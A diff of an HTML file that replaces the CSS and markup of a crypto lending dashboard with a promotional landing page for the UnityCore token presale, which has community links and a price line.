-        .css-nq2fwf.css-nq2fwf.css-nq2fwf {
-            padding-right: 32px;
-        }
-
-        .css-nq2fwf.MuiSelect-select {
-            height: auto;
-            min-height: 1.4375em;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-            overflow: hidden;
-        }
-
-        .css-nq2fwf.MuiSelect-select {
-            background-color: #F7F7F9;
-            font-family: Inter, Arial;
-            font-weight: 500;
-            line-height: 1.5rem;
-            font-size: 0.875rem;
-            padding: 6px 12px;
-            color: #62677B;
-        }
-
-        .css-nq2fwf::-webkit-input-placeholder {
-            color: currentColor;
-            opacity: 0.42;
-            -webkit-transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-        }
-
-        .css-nq2fwf::-moz-placeholder {
-            color: currentColor;
-            opacity: 0.42;
-            -webkit-transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-        }
-
-        .css-nq2fwf:-ms-input-placeholder {
-            color: currentColor;
-            opacity: 0.42;
-            -webkit-transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-        }
-
-        .css-nq2fwf::-ms-input-placeholder {
-            color: currentColor;
-            opacity: 0.42;
-            -webkit-transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-        }
-
-        .css-nq2fwf:focus {
-            outline: 0;
-        }
-
-        .css-nq2fwf:invalid {
-            box-shadow: none;
-        }
-
-        .css-nq2fwf::-webkit-search-decoration {
-            -webkit-appearance: none;
-        }
-
-        label[data-shrink=false]+.MuiInputBase-formControl .css-nq2fwf::-webkit-input-placeholder {
-            opacity: 0 !important;
-        }
-
-        label[data-shrink=false]+.MuiInputBase-formControl .css-nq2fwf::-moz-placeholder {
-            opacity: 0 !important;
-        }
-
-        label[data-shrink=false]+.MuiInputBase-formControl .css-nq2fwf:-ms-input-placeholder {
-            opacity: 0 !important;
-        }
-
-        label[data-shrink=false]+.MuiInputBase-formControl .css-nq2fwf::-ms-input-placeholder {
-            opacity: 0 !important;
-        }
-
-        label[data-shrink=false]+.MuiInputBase-formControl .css-nq2fwf:focus::-webkit-input-placeholder {
-            opacity: 0.42;
-        }
-
-        label[data-shrink=false]+.MuiInputBase-formControl .css-nq2fwf:focus::-moz-placeholder {
-            opacity: 0.42;
-        }
-
-        label[data-shrink=false]+.MuiInputBase-formControl .css-nq2fwf:focus:-ms-input-placeholder {
-            opacity: 0.42;
-        }
-
-        label[data-shrink=false]+.MuiInputBase-formControl .css-nq2fwf:focus::-ms-input-placeholder {
-            opacity: 0.42;
-        }
-
-        .css-nq2fwf.Mui-disabled {
-            opacity: 1;
-            -webkit-text-fill-color: #D2D4DC;
-        }
-
-        .css-nq2fwf:-webkit-autofill {
-            -webkit-animation-duration: 5000s;
-            animation-duration: 5000s;
-            -webkit-animation-name: mui-auto-fill;
-            animation-name: mui-auto-fill;
-        }
-
-        .css-nq2fwf:-webkit-autofill {
-            border-radius: inherit;
-        }
-
-        .css-1slt5fp {
-            margin-right: 8px;
-            width: 28px;
-            height: 28px;
-            position: relative;
-        }
-
-        .css-vc54u4 {
-            margin-right: 4px;
-            display: -webkit-inline-box;
-            display: -webkit-inline-flex;
-            display: -ms-inline-flexbox;
-            display: inline-flex;
-            -webkit-align-items: flex-start;
-            -webkit-box-align: flex-start;
-            -ms-flex-align: flex-start;
-            align-items: flex-start;
-        }
-
-        .css-1jz7z4v {
-            margin: 0;
-            font-family: Inter, Arial;
-            font-weight: 700;
-            letter-spacing: 0.015625rem;
-            line-height: 123.5%;
-            font-size: 1.75rem;
-            color: #fff;
-            margin-right: 4px;
-        }
-
-        .css-wzu3c {
-            color: #fff;
-            padding-left: 8px;
-            padding-right: 8px;
-            border-radius: 12px;
-            background: linear-gradient(248.86deg, #fa7202 10.51%, #fc9109 93.41%);
-        }
-
-        .css-my2x37 {
-            margin: 0;
-            font-family: Inter, Arial;
-            font-weight: 500;
-            letter-spacing: 0.00625rem;
-            line-height: 1rem;
-            font-size: 0.75rem;
-        }
-
-        .css-1k3x8v3 {
-            bottom: 0;
-            left: 0;
-            position: absolute;
-            opacity: 0;
-            pointer-events: none;
-            width: 100%;
-            box-sizing: border-box;
-        }
-
-        .css-1b6c8bu {
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
-            width: 1em;
-            height: 1em;
-            display: inline-block;
-            fill: currentColor;
-            -webkit-flex-shrink: 0;
-            -ms-flex-negative: 0;
-            flex-shrink: 0;
-            -webkit-transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            font-size: 1.5rem;
-            position: absolute;
-            right: 7px;
-            top: calc(50% - .5em);
-            pointer-events: none;
-            color: #8E92A3;
-        }
-
-        .css-1b6c8bu.Mui-disabled {
-            color: #BBBECA;
-        }
-
-        .css-igs3ac {
-            text-align: left;
-            position: absolute;
-            bottom: 0;
-            right: 0;
-            top: -5px;
-            left: 0;
-            margin: 0;
-            padding: 0 8px;
-            pointer-events: none;
-            border-radius: inherit;
-            border-style: solid;
-            border-width: 1px;
-            overflow: hidden;
-            min-width: 0%;
-            border-color: rgba(0, 0, 0, 0.23);
-        }
-
-        .css-ihdtdm {
-            float: unset;
-            width: auto;
-            overflow: hidden;
-            padding: 0;
-            line-height: 11px;
-            -webkit-transition: width 150ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
-            transition: width 150ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
-        }
-
-        .css-k7vncv {
-            display: -webkit-box;
-            display: -webkit-flex;
-            display: -ms-flexbox;
-            display: flex;
-            -webkit-align-items: flex-start;
-            -webkit-box-align: flex-start;
-            -ms-flex-align: flex-start;
-            align-items: flex-start;
-            -webkit-box-flex-wrap: wrap;
-            -webkit-flex-wrap: wrap;
-            -ms-flex-wrap: wrap;
-            flex-wrap: wrap;
-            width: 100%;
-        }
-
-        @media (min-width:0px) {
-            .css-k7vncv {
-                gap: 12px;
-            }
-        }
-
-        @media (min-width:640px) {
-            .css-k7vncv {
-                gap: 32px;
-            }
-        }
-
-        .css-ltjh6b {
-            display: -webkit-box;
-            display: -webkit-flex;
-            display: -ms-flexbox;
-            display: flex;
-            -webkit-align-items: center;
-            -webkit-box-align: center;
-            -ms-flex-align: center;
-            align-items: center;
-        }
-
-        @media (min-width:0px) {
-            .css-ltjh6b {
-                width: calc(50% - 12px);
-            }
-        }
-
-        @media (min-width:640px) {
-            .css-ltjh6b {
-                width: unset;
-            }
-        }
-
-        .css-q6wgnv {
-            -webkit-align-items: center;
-            -webkit-box-align: center;
-            -ms-flex-align: center;
-            align-items: center;
-            -webkit-box-pack: center;
-            -ms-flex-pack: center;
-            -webkit-justify-content: center;
-            justify-content: center;
-            border: 1px solid #EBEBED1F;
-            border-radius: 12px;
-            background-color: #383D51;
-            box-shadow: 0px 2px 1px rgba(0, 0, 0, 0.05), 0px 0px 1px rgba(0, 0, 0, 0.25);
-            width: 42px;
-            height: 42px;
-            margin-right: 12px;
-        }
-
-        @media (min-width:0px) {
-            .css-q6wgnv {
-                display: none;
-            }
-        }
-
-        @media (min-width:960px) {
-            .css-q6wgnv {
-                display: -webkit-box;
-                display: -webkit-flex;
-                display: -ms-flexbox;
-                display: flex;
-            }
-        }
-
-        .css-j7qwjs {
-            display: -webkit-box;
-            display: -webkit-flex;
-            display: -ms-flexbox;
-            display: flex;
-            -webkit-flex-direction: column;
-            -ms-flex-direction: column;
-            flex-direction: column;
-        }
-
-        .css-18biwo {
-            display: -webkit-inline-box;
-            display: -webkit-inline-flex;
-            display: -ms-inline-flexbox;
-            display: inline-flex;
-            -webkit-align-items: center;
-            -webkit-box-align: center;
-            -ms-flex-align: center;
-            align-items: center;
-        }
-
-        .css-1fzsl0k {
-            margin: 0;
-            font-family: Inter, Arial;
-            font-weight: 400;
-            letter-spacing: 0.009375rem;
-            line-height: 1rem;
-            font-size: 0.75rem;
-            color: #A5A8B6;
-        }
-
-        .css-o92e62 {
-            display: block;
-            background-color: rgba(48, 53, 73, 0.11);
-            height: auto;
-            margin-top: 0;
-            margin-bottom: 0;
-            transform-origin: 0 55%;
-            -webkit-transform: scale(1, 0.60);
-            -moz-transform: scale(1, 0.60);
-            -ms-transform: scale(1, 0.60);
-            transform: scale(1, 0.60);
-            border-radius: 4px/6.7px;
-            -webkit-animation: animation-c7515d 1.5s ease-in-out 0.5s infinite;
-            animation: animation-c7515d 1.5s ease-in-out 0.5s infinite;
-            -webkit-transform: unset;
-            -moz-transform: unset;
-            -ms-transform: unset;
-            transform: unset;
-            background: #383D51;
-        }
-
-        .css-o92e62:empty:before {
-            content: "\00a0";
-        }
-
-        .css-ulme3a {
-            display: -webkit-inline-box;
-            display: -webkit-inline-flex;
-            display: -ms-inline-flexbox;
-            display: inline-flex;
-            cursor: pointer;
-            -webkit-transition: all 0.2s ease;
-            transition: all 0.2s ease;
-        }
-
-        .css-ulme3a:hover {
-            opacity: 0.5;
-        }
-
-        .css-a9efdy {
-            display: -webkit-inline-box;
-            display: -webkit-inline-flex;
-            display: -ms-inline-flexbox;
-            display: inline-flex;
-            -webkit-align-items: center;
-            -webkit-box-align: center;
-            -ms-flex-align: center;
-            align-items: center;
-            -webkit-box-pack: center;
-            -ms-flex-pack: center;
-            -webkit-justify-content: center;
-            justify-content: center;
-            position: relative;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-            background-color: transparent;
-            outline: 0;
-            border: 0;
-            margin: 0;
-            border-radius: 0;
-            padding: 0;
-            cursor: pointer;
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
-            vertical-align: middle;
-            -moz-appearance: none;
-            -webkit-appearance: none;
-            -webkit-text-decoration: none;
-            text-decoration: none;
-            color: inherit;
-            text-align: center;
-            -webkit-flex: 0 0 auto;
-            -ms-flex: 0 0 auto;
-            flex: 0 0 auto;
-            font-size: 1.5rem;
-            padding: 8px;
-            border-radius: 50%;
-            overflow: visible;
-            color: #8E92A3;
-            -webkit-transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            display: -webkit-box;
-            display: -webkit-flex;
-            display: -ms-flexbox;
-            display: flex;
-            -webkit-align-items: center;
-            -webkit-box-align: center;
-            -ms-flex-align: center;
-            align-items: center;
-            -webkit-box-pack: center;
-            -ms-flex-pack: center;
-            -webkit-justify-content: center;
-            justify-content: center;
-            width: 14px;
-            height: 14px;
-            border-radius: 50%;
-            padding: 0px;
-            min-width: 0;
-            margin-left: 2px;
-        }
-
-        .css-a9efdy::-moz-focus-inner {
-            border-style: none;
-        }
-
-        .css-a9efdy.Mui-disabled {
-            pointer-events: none;
-            cursor: default;
-        }
-
-        @media print {
-            .css-a9efdy {
-                -webkit-print-color-adjust: exact;
-                color-adjust: exact;
-            }
-        }
-
-        .css-a9efdy:hover {
-            background-color: rgba(142, 146, 163, 0.04);
-        }
-
-        @media (hover: none) {
-            .css-a9efdy:hover {
-                background-color: transparent;
-            }
-        }
-
-        .css-a9efdy.Mui-disabled {
-            background-color: transparent;
-            color: #BBBECA;
-        }
-
-        .css-1rqf5ri {
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
-            width: 1em;
-            height: 1em;
-            display: inline-block;
-            fill: currentColor;
-            -webkit-flex-shrink: 0;
-            -ms-flex-negative: 0;
-            flex-shrink: 0;
-            -webkit-transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            font-size: 1.5rem;
-            font-size: 14px;
-            color: #A5A8B6;
-            border-radius: 50%;
-        }
-
-        .css-1rqf5ri:hover {
-            color: #0062D2;
-        }
-
-        .css-159pi92 {
-            display: -webkit-box;
-            display: -webkit-flex;
-            display: -ms-flexbox;
-            display: flex;
-            -webkit-flex-direction: column;
-            -ms-flex-direction: column;
-            flex-direction: column;
-            -webkit-flex: 1;
-            -ms-flex: 1;
-            flex: 1;
-        }
-
-        @media (min-width:0px) {
-            .css-159pi92 {
-                margin-top: -32px;
-            }
-        }
-
-        @media (min-width:1280px) {
-            .css-159pi92 {
-                margin-top: -46px;
-            }
-        }
-
-        @media (min-width:1575px) {
-            .css-159pi92 {
-                margin-top: -44px;
-            }
-        }
-
-        @media (min-width:1800px) {
-            .css-159pi92 {
-                margin-top: -48px;
-            }
-        }
-
-        .css-1a8qn2o {
-            width: 100%;
-            margin-left: auto;
-            box-sizing: border-box;
-            margin-right: auto;
-            display: block;
-            padding-left: 8px;
-            padding-right: 8px;
-            display: -webkit-box;
-            display: -webkit-flex;
-            display: -ms-flexbox;
-            display: flex;
-            -webkit-flex-direction: column;
-            -ms-flex-direction: column;
-            flex-direction: column;
-            -webkit-flex: 1;
-            -ms-flex: 1;
-            flex: 1;
-            padding-bottom: 39px;
-        }
-
-        @media (min-width:760px) {
-            .css-1a8qn2o {
-                padding-left: 12px;
-                padding-right: 12px;
-            }
-        }
-
-        @media (min-width:1280px) {
-            .css-1a8qn2o {
-                max-width: 1280px;
-            }
-        }
-
-        @media (min-width:0px) {
-            .css-1a8qn2o {
-                padding-left: 8px;
-                padding-right: 8px;
-            }
-        }
-
-        @media (min-width:640px) {
-            .css-1a8qn2o {
-                padding-left: 20px;
-                padding-right: 20px;
-            }
-        }
-
-        @media (min-width:760px) {
-            .css-1a8qn2o {
-                padding-left: 48px;
-                padding-right: 48px;
-            }
-        }
-
-        @media (min-width:960px) {
-            .css-1a8qn2o {
-                padding-left: 96px;
-                padding-right: 96px;
-            }
-        }
-
-        @media (min-width:1280px) {
-            .css-1a8qn2o {
-                padding-left: 20px;
-                padding-right: 20px;
-            }
-        }
-
-        @media (min-width:1575px) {
-            .css-1a8qn2o {
-                max-width: unset;
-                padding-left: 96px;
-                padding-right: 96px;
-            }
-        }
-
-        @media (min-width:1800px) {
-            .css-1a8qn2o {
-                padding-left: 0;
-                padding-right: 0;
-                max-width: 1440px;
-            }
-        }
-
-        .css-11mxx5g {
-            background-color: #FFFFFF;
-            color: #303549;
-            -webkit-transition: box-shadow 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            transition: box-shadow 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
-            border-radius: 4px;
-            box-shadow: 0px 2px 1px -1px rgba(0, 0, 0, 0.2), 0px 1px 1px 0px rgba(0, 0, 0, 0.14), 0px 1px 3px 0px rgba(0, 0, 0, 0.12);
-            border-radius: 4px;
-            box-shadow: 0px 2px 1px rgba(0, 0, 0, 0.05), 0px 0px 1px rgba(0, 0, 0, 0.25);
-            display: -webkit-box;
-            display: -webkit-flex;
-            display: -ms-flexbox;
-            display: flex;
-            -webkit-flex-direction: column;
-            -ms-flex-direction: column;
-            flex-direction: column;
-            -webkit-align-items: center;
-            -webkit-box-align: center;
-            -ms-flex-align: center;
-            align-items: center;
-            -webkit-box-pack: center;
-            -ms-flex-pack: center;
-            -webkit-justify-content: center;
-            justify-content: center;
-            text-align: center;
-            padding: 16px;
-            -webkit-flex: 1;
-            -ms-flex: 1;
-            flex: 1;
-        }
-
-        .css-11zj654 {
-            margin: 0;
-            font-family: 'Space Grotesk';
-            font-weight: 600;
-            letter-spacing: unset;
-            line-height: 133.4%;
-            font-size: 1.3125rem;
-            margin-bottom: 8px;
-            margin-top: 10px;
-        }
-
-        .css-roudg2 {
-            margin: 0;
-            font-family: 'Space Grotesk';
-            font-weight: 400;
-            letter-spacing: 0.009375rem;
-            line-height: 143%;
-            font-size: 0.875rem;
-            color: #62677B;
-            margin-bottom: 24px;
-        }
-        .nav-pills .nav-link {
-            color: #2d67f5;
-            font-family: 'Space Grotesk';
-        }
-        .nav-pills .nav-link.active, .nav-pills .show>.nav-link {
-            background: linear-gradient(248.86deg, #296ffa 10.51%, #6717ce 93.41%);
-        }
-        .dropdown-menu.show {
-            display: block;
-            background-color: #191b28;
-        }
-        .dropdown-item{
-            font-family: 'Space Grotesk';
-            color: white;
-        }
-        .btn-check:checked+.btn, .btn.active, .btn.show, .btn:first-child:active, :not(.btn-check)+.btn:active {
-            color: var(--bs-btn-active-color);
-            background-color: #191b28;
-            border-color: #ffffff;
-        }
-        .btn-outline-secondary {
-        --bs-btn-border-color: white;
-        }
-        .navbar-nav .nav-link.active, .navbar-nav .show>.nav-link {
-            color: rgb(255 255 255);
-            font-family: 'Space Grotesk';
-        }
-        .input-group:not(.has-validation)>.dropdown-toggle:nth-last-child(n+3), .input-group:not(.has-validation)>.form-floating:not(:last-child)>.form-control, .input-group:not(.has-validation)>.form-floating:not(:last-child)>.form-select, .input-group:not(.has-validation)>:not(:last-child):not(.dropdown-toggle):not(.dropdown-menu):not(.form-floating) {
-            font-family: 'Space Grotesk';
-        }
-       
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="referrer" content="same-origin">
+<title>Unity Protocol- The First Lending Protocol On Core</title>
+<link rel="icon" type="image/svg" sizes="32x32" href="assets/unitycore.png">
+<link href="assets/fonts/sfuidisplay.css" rel="stylesheet">
+<link rel="stylesheet" href="../use.fontawesome.com/releases/v5.8.1/css/all.css">
+<link rel="stylesheet" href="assets/css/plugins.min.css">
+<link rel="stylesheet" href="assets/css/app.css">
+<link rel="stylesheet" href="assets/css/custom.css">
+<style>
+.container { max-width: 1000px; }
+</style>
 </head>
+<body class="theme-gradient-1" data-spy="scroll" data-target="#navbar-nav" data-animation="false" data-appearance="dark" style="overflow-x:hidden;">
+<main class="main">
+    <header class="navbar navbar-sticky sticky-bg-color--dark navbar-expand-lg navbar-dark">
+        <div class="container-fluid position-relative">
+            <a class="navbar-brand smooth-scroll" href="#top">
+                <img class="navbar-brand__regular" src="assets/unitycore.png" width="100" alt="brand-logo">
+                <img class="navbar-brand__sticky" src="assets/unitycore.png" width="100" alt="sticky brand-logo">
+            </a>
+            <button class="navbar-toggler d-lg-none" type="button" data-toggle="navbarToggler" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
 
-<body>
-        <nav class="navbar" style="background :linear-gradient(248.86deg, #6717ce 10.51%, #296ffa 93.41%);">
-            <div class="container-fluid">
-                <img src="./unitycore.png" alt="Logo" width="30" height="30" class="d-inline-block align-text-top">
-                    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarTogglerDemo03" aria-controls="navbarTogglerDemo03" aria-expanded="false" aria-label="Toggle navigation">
-                        <span class="navbar-toggler-icon"></span>
-                    </button>    
-                <div class="collapse navbar-collapse" id="navbarTogglerDemo03">
-                    <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+            <div class="navbar-inner">
+                <button class="navbar-toggler d-lg-none" type="button" data-toggle="navbarToggler" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <nav>
+                    <ul class="navbar-nav" id="navbar-nav">
                         <li class="nav-item">
-                            <a class="nav-link active" aria-current="page" href="https://unitytokensd.com">Home</a>
+                            <a class="nav-link" href="#introduce">Unity Protocol</a>
                         </li>
                         <li class="nav-item">
-                            <a class="nav-link active" aria-current="page" href="index.html">Dashboard</a>
+                            <a class="nav-link" href="#tokenomics">Tokenomics</a>
                         </li>
                         <li class="nav-item">
-                            <a class="nav-link active" aria-current="page" href="markets/">Markets</a>
+                            <a class="nav-link" href="#roadmap">Roadmap</a>
                         </li>
                         <li class="nav-item">
-                            <a class="nav-link active" aria-current="page" href="staking/">Stake</a>
+                            <a class="nav-link" href="#app">App</a>
                         </li>
-                        <li class="nav-item">
-                            <a class="nav-link active" aria-current="page" href="governance/">Governance</a>
-                        </li>
-                        <ul class="nav nav-pills">
-                            <li class="nav-item">
-                                <button class="nav-link  dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false" style="color: white;">
-                                    More...
+                    </ul>
+                </nav>
+            </div>
+            <div class="d-flex align-items-center ml-lg-1 ml-xl-2 mr-5 mr-sm-6 m-lg-0">
+                <div class="button-group d-flex flex-column flex-sm-row align-items-center reveal">
+                            <div class="d-flex flex-row align-items-middle mb-2">
+                                <button class="btn btn-size--sm btn-bg--primary btn-border--width--2 rounded--full color--white btn-hover--splash coming-soon">
+                                    <span class="btn__text" href="https://app.unitytokensd.com">Launch App</span>
                                 </button>
-                                <ul class="dropdown-menu dropdown-menu-dark">      
-                                    <li>
-                                        <a class="dropdown-item " href="https://scan.coredao.org/" target="_blank">
-                                           Core Explorer
-                                        </a>
-                                        <a class="dropdown-item " href="https://discord.gg/67UzyXVKda" target="_blank">
-                                           Discord
-                                        </a>
-                                        <a class="dropdown-item " href="https://twitter.com/unitycorepro" target="_blank">
-                                           Twitter
-                                        </a>
-                                        <a class="dropdown-item " href="http://unitycore-protocol.gitbook.io" target="_blank">
-                                           Whitepaper
-                                        </a>
-                                    </li>
-                                </ul>
-                            </li>
-                        </ul>
+                            </div>
+                        </div>
+                
+                <div class="dropdown-module dropdown-module--dark d-inline-block position-relative ml-1 ml-sm-2">
+                    <button class="dropdown-module__toggler" type="button">
+                        <span class="flag-image">
+                            
+                            <img src="assets/img/flag/uk.svg" alt="flag" class="svg">
+                            
+                        </span>
+                    </button>
+                    <ul class="dropdown-module-list">
+                        <li>
+                            <a class="dropdown-module__item d-flex align-items-center" data-lang="en" href="javascript:;"><span class="flag-image mr-2"><img src="assets/img/flag/uk.svg" alt="flag" class="svg"></span>English</a>
+                        </li>
+                        <li>
+                            <a class="dropdown-module__item d-flex align-items-center" data-lang="ko" href="javascript:;"><span class="flag-image mr-2">🇰🇷</span>한국인</a>
+                        </li>
+                        <li>
+                            <a class="dropdown-module__item d-flex align-items-center" data-lang="zh" href="javascript:;"><span class="flag-image mr-2"><img src="assets/img/flag/cn.png" alt="flag"></span>中文</a>
+                        </li>
                     </ul>
                 </div>
             </div>
-        </nav>
-      
-        <main class="MuiBox-root css-b95f0i">
-            <div class="MuiBox-root css-614h4q">
-                <div class="MuiContainer-root MuiContainer-maxWidthLg css-ycl373">
-                    <div class="MuiBox-root css-nkvznt">
-                        <div class="MuiBox-root css-70qvj9">
-                            <div class="MuiBox-root css-1czjwln">
-                                <div class="MuiBox-root css-gr0tg3">
-                                    <div class="MuiFormControl-root MuiTextField-root css-1s2gcw8"
-                                        aria-label="select market" data-cy="marketSelector">
-                                        <div
-                                            class="MuiInputBase-root MuiOutlinedInput-root MuiInputBase-colorPrimary MuiInputBase-formControl MarketSwitcher__select css-o4f6xn">
-                                            <div tabindex="0" role="button" aria-expanded="false"
-                                                aria-haspopup="listbox"
-                                                class="MuiSelect-select MuiSelect-outlined MuiInputBase-input MuiOutlinedInput-input css-nq2fwf">
-                                                <div class="MuiBox-root css-70qvj9">
-                                                    <div class="MuiBox-root css-1slt5fp"><img
-                                                            src="icons/networks/coredao.png" alt="" width="100%"
-                                                            height="100%" /></div>
-                                                    <div class="MuiBox-root css-vc54u4">
-                                                        <h1 class="MuiTypography-root MuiTypography-h1 css-1jz7z4v">
-                                                            Core Chain</h1>
-                                                    </div>
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div>
+        </div>
+    </header>
+    <section id="top" class="hero hero--v3 ico-progress ico-progress--v2 section--dark bg-color--dark--1 d-flex align-items-center hidden">
+        <div class="background-holder background--move z-index1">
+            <img src="assets/img/layout/bg-overlay-06.svg" alt="image" class="background-image-holder">
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-12 col-md-10 col-lg-8 px-lg-0 mx-auto mb-3 mb-lg-0 mt-8 mt-lg-0 text-center z-index2">
+                    <div class="hero-content">
+                        <h1 class="hero__title h2-font mb-2">About UnityCore Protocol</h1>
+                        <p class="hero__description mb-3 mb-lg-5 mb-md-6">
+                            
+                            In crypto we have two prominent use cases, which is Holding and trading. In UNITYCORE we will bring an innovative, experimental, and community-based project, aiming to revolutionize the digital and real-world in everyway. $UNITYCORE is created to unite humans throughout the universe, with a peer-peer Lending and Borrowing protocol. $ UNITYCORE will ensure freedoms, spread love, fight hate and global inequality, directly changing the world through the power of blockchain technology, all while making crypto truly fun. 
+                            
+                        </p>
+                        <a href="https://discord.gg/GGrkgYFJNw" class="btn btn-bg--cta--1 rounded--full btn-hover--3d btn-hover--splash mb-2 mx-1 smooth-scroll">
+                            <i class="fa fa-gem color--white pr-1 h6-font font-w--700"></i>
+                            <span class="btn__text">Discord</span>
+                        </a>
+                        <a href="https://t.me/unitycore1" class="btn btn-bg--primary rounded--full btn-hover--3d btn-hover--splash mb-2 mx-1 smooth-scroll">
+                            <i class="fa fa-parachute-box color--white pr-1 h6-font font-w--700"></i>
+                            <span class="btn__text">Telegram</span>
+                        </a>
+                    </div>
+                </div>
+                <div class="col-12 col-md-1 mr-md-3 text-center icon-group--sticky" style="z-index:10;">
+                    <ul class="icon-group icon-group--vertical rounded--full rounded--full justify-content-center">
+                        <li><a href="#" target="_blank" class="color--primary"><i class="fab fa-telegram-plane"></i></a></li>
+                        <li><a href="https://twitter.com/unitycorepro" target="_blank" class="color--primary"><i class="fab fa-twitter"></i></a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="row mt-3">
+                <div class="col-12 col-md-10 mx-auto text-md-center">
+                    <div class="bg-color--dark--2 rounded--10 pr-lg-3 d-md-inline-block d-lg-block">
+                        <div class="pricing-info d-md-flex align-items-center justify-content-between justify-content-md-start">
+                            <div class="d-md-flex align-items-center justify-content-md-center justify-content-lg-start text-center text-md-left mb-md-0">
+                                <div class="pricing-info-item pricing-info-item--active px-md-2 mr-xl-4">
+                                    <span class="text-color--400 font-size--20">Current Price</span>
+                                    <p class="font-size--20 font-w--700 mt-md-2">1 <span class="font-w--500"> $UCORE</span> = 0.9 <span class="font-w--500">ICE</span></p>
+                                    
                                 </div>
+                                <div class="pricing-info-item py-1"></div>
+                            </div>
+                            <div class="text-center text-md-left pb-2 pb-lg-0 px-3">
+                                <span class="text-color--400 font-size--20 mt-2">Presale Starting</span>
+                                <ul class="d-flex justify-content-center justify-content-lg-start text-left px-0">
+                                    <li class="d-flex flex-column mr-2 mr-sm-3 count_down_days">
+                                        <span class="number color--white opacity--80 font-size--40 font-w--600">16</span>
+                                        <span class="text-color--400">DAY</span>
+                                    </li>
+                                    <li class="d-flex flex-column mr-2 mr-sm-3 count_down_hours">
+                                        <span class="number color--white opacity--80 font-size--40 font-w--600">04</span>
+                                        <span class="text-color--400">MONTH</span>
+                                    </li>
+                                    <li class="d-flex flex-column mr-2 mr-sm-3 count_down_minutes">
+                                        <span class="number color--white opacity--80 font-size--40 font-w--600">2023</span>
+                                        <span class="text-color--400">YEAR</span>
+                                    </li>
+                                </ul>
                             </div>
                         </div>
-                        <ul class="nav nav-pills">
-                            <li class="nav-item">
-                              <a class="nav-link active" data-toggle="pill" href="#supply">Supply</a>
-                            </li>
-                            <li class="nav-item">
-                              <a class="nav-link" data-toggle="pill" href="#borrow">Borrow</a>
-                            </li>
-                        </ul>
-                          
-                          <!-- Tab panes -->
-                        <div class="tab-content">
-                            <div class="tab-pane container active" id="supply"> 
-                                <h2 class="MuiTypography-root MuiTypography-h2 css-11zj654">Supply assets</h2>
-                                <p class="MuiTypography-root MuiTypography-description css-roudg2">
-                                    Everything you need to know about supplying
-                                </p>
-                            </div>
-                            <div class="tab-pane container fade" id="borrow">
-                                <h2 class="MuiTypography-root MuiTypography-h2 css-11zj654">Borrow</h2>
-                                <p class="MuiTypography-root MuiTypography-description css-roudg2">
-                                    Everything you need to know about borrowing
-                                </p>
-                            </div>
-                        </div>
-                       
-                    <!-- Search Bar starts here-->
-                          <div class="input-group" style="margin-top: 5%;">
-                            <input type="text" class="form-control" aria-label="Text input with segmented dropdown button" placeholder="Search assets">
-                            <button type="button" class="btn btn-outline-secondary dropdown-toggle dropdown-toggle-split" data-bs-toggle="dropdown" aria-expanded="false">
-                                <span class="visually-hidden">Toggle Dropdown</span>
-                               
-                            </button>
-                            <ul class="dropdown-menu dropdown-menu-end">
-                              <li><a class="dropdown-item" href="#">All assets</a></li>
-                              <li><hr class="dropdown-divider"></li>
-                              <li><a class="dropdown-item" href="#">Supply assets</a></li>
-                            </ul>
-                          </div>
-                    <!-- Search Bar ends here-->
-                      <!-- <div class="MuiBox-root css-k7vncv"> 
-                            <div class="MuiBox-root css-ltjh6b">
-                                <div class="MuiBox-root css-q6wgnv"><svg width="20" height="19" viewBox="0 0 20 19"
-                                        fill="none" xmlns="http://www.w3.org/2000/svg" role="img">
-                                        <path
-                                            d="M17 17.398H3a2 2 0 0 1-2-2v-9a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2Z"
-                                            stroke="#A5A8B6" stroke-width="1.5"></path>
-                                        <path d="M14.5 11.398a.5.5 0 1 1 0-1 .5.5 0 0 1 0 1Z" stroke="#A5A8B6"
-                                            stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
-                                        <path d="M16 4.398V3a2 2 0 0 0-2.515-1.932l-11 2.933A2 2 0 0 0 1 5.934v.464"
-                                            stroke="#A5A8B6" stroke-width="1.5"></path>
-                                    </svg></div>
-                                <div class="MuiBox-root css-j7qwjs">
-                                    <div class="MuiBox-root css-18biwo">
